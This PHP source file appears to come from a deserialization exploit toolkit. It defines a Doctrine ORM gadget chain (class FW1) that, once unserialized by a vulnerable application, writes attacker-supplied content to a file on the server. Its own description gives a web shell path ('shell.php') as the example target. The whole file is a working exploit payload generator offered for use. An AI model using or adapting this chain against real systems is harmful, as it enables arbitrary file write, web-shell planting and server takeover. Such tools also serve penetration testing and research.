<?php

namespace GadgetChain\Doctrine;

use \Doctrine\ORM\EntityManager;
use \Doctrine\ORM\Configuration;
use \Doctrine\ORM\Mapping\ClassMetadataFactory;
use \Doctrine\ORM\Query\ResultSetMappingBuilder;
use \Doctrine\Common\Cache\FilesystemCache;
use \Doctrine\Common\Annotations\CachedReader;
use \Doctrine\ORM\Mapping\Driver\AnnotationDriver;


class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '?';
    public static $vector = '__toString';
    public static $author = 'cf';
    public static $information = '
        We do not have full control of the path. If you enter
        /var/www/toto/shell.php as the remote_path, it will be converted to
        /var/www/toto/e3/5b737464436c61737324434c4153534d455441444154415d5b315d.php.
        Only the extension and base path are kept.
    ';

    public function process_parameters(array $parameters)
    {
        $parameters = parent::process_parameters($parameters);
        # Sadly we cannot control the full path
        # We only have control over the base directory, and the extension
        $path = $parameters['remote_path'];
        $infos = (object) pathinfo($path);
        
        if(isset($infos->extension))
            $parameters['extension'] = '.' . $infos->extension;
        else
            $parameters['extension'] = '';
        
        $parameters['directory'] = $infos->dirname;
        $parameters['path'] = $infos->dirname . '/e3/5b737464436c61737324434c4153534d455441444154415d5b315d' . $parameters['extension'];
        return $parameters;
    }

    public function generate(array $parameters)
    {
        $c = new Configuration([

        ]);
        $table = (object) [
            'name' => $parameters['data'],
            'schema' => '',
            'indexes' => null,
            'uniqueConstraints' => null,
            'options' => null
        ];
        $em0 = new EntityManager(null, $c);
        $d0 = new AnnotationDriver(new CachedReader([
            'stdClass' => 
            [
                'Doctrine\ORM\Mapping\Embeddable' => true,
                'Doctrine\ORM\Mapping\Table' => $table
            ]
        ]));
        $fc = new FilesystemCache($parameters['directory'], $parameters['extension']);
        $mf = new ClassMetadataFactory($fc, $em0, $d0);
        $em = new EntityManager($mf, null);
        $writer = new ResultSetMappingBuilder($em);

        return $writer;
    }
}
